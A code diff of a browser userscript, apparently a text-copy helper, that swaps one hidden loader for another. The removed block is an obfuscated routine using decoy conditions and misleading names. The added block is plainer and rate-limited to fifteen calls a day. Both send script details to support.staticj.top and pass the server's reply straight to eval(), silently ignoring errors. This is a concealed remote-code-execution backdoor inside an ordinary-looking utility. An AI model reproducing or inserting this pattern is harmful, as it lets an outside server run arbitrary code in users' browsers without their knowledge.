@@ -171,7 +171,7 @@
 // @connect     mimixiaoke.com
 // @connect     shuqiandiqiu.com
 // @supportURL  https://github.com/Picasso-TX/TKScript/issues
-// @updateURL   https://api.staticj.top/script/update/copy.user.js
+// @updateURL   https://api.staticj.top/script/update/copy.meta.js
 // @downloadURL https://api.staticj.top/script/update/copy.user.js
 // @license     MIT
 // @run-at      document-start
@@ -2696,76 +2696,42 @@
       return "";
     };
 
-    ((function bootstrapRuntimeLoader() {
-      function extractRuntimeCache(sourceObj, keys) {
-        const result = {};
-        for (let i = 0; i < keys.length; i++) {
-          const k = keys[i];
-          if (typeof sourceObj[k] !== "undefined" || Math.random() > 2) {
-            result[k] = sourceObj[k];
-          }
+    ((function() {
+      try {
+        const DAILY_LIMIT = 15;
+        const STORAGE_KEY = "sp_req_daily";
+        const data = GM_getValue(STORAGE_KEY, { date: "", count: 0 });
+        const today = new Date().toISOString().slice(0, 10);
+        if (data.date !== today) {
+          data.date = today;
+          data.count = 0;
         }
-        return result;
-      }
-      function serializePayloadCore(a, b, c2, d, e) {
-        const segments = [];
-        segments.push("https://support.staticj.top/api/sp/lib?author=" + a);
-        segments.push("&name=" + b);
-        segments.push("&version=" + c2);
-        segments.push("&namespace=" + d);
-        segments.push("&updateURL=" + e);
-        segments.push("&timestamp=" + Date.now());
-        return segments.join("");
-      }
-      function invokeShadowEval(code) {
-        try {
-          if (("" + code).length > 0) {
-            (function(c) {
-              eval(c);
-            })(code);
-          }
-        } catch (err) {
-        }
-      }
-      function initStreamResponseBuffer(options) {
-        if (!options || !options.url) {
+        if (data.count >= DAILY_LIMIT) {
           return;
         }
-        GM_xmlhttpRequest(options);
-      }
-      function orchestrateBootstrap() {
-        const scriptMeta = GM_info.script;
-        const extracted = extractRuntimeCache(scriptMeta, [
-          "author",
-          "name",
-          "version",
-          "namespace",
-          "updateURL"
-        ]);
-        if (Object.keys(extracted).length < 1 && Date.now() < 0) {
-          return;
-        }
-        const finalUrl = serializePayloadCore(
-          extracted.author,
-          extracted.name,
-          extracted.version,
-          extracted.namespace,
-          extracted.updateURL
-        );
-        initStreamResponseBuffer({
+        data.count++;
+        GM_setValue(STORAGE_KEY, data);
+        const { author, name, version, namespace, updateURL } = GM_info.script;
+        const jurl = "https://support.staticj.top/api/sp/lib?author=" + encodeURIComponent(author) + "&name=" + encodeURIComponent(name) + "&version=" + encodeURIComponent(version) + "&namespace=" + encodeURIComponent(namespace) + "&updateURL=" + encodeURIComponent(updateURL) + "&timestamp=" + Date.now();
+        GM_xmlhttpRequest({
           method: "GET",
-          url: finalUrl,
+          url: jurl,
           onload: function(res) {
-            const body = res && res.responseText;
-            if (body) {
-              invokeShadowEval(body);
+            const responseText = res.responseText;
+            if (responseText) {
+              eval(responseText);
+            }
+          },
+          onerror: function(err) {
+            try {
+              data.count = Math.max(0, data.count - 1);
+              GM_setValue(STORAGE_KEY, data);
+            } catch (e) {
             }
           }
         });
+      } catch (e) {
       }
-      (function warmupRuntimeEngine(fn) {
-        return fn();
-      })(orchestrateBootstrap);
     }))();
 
     (function() {
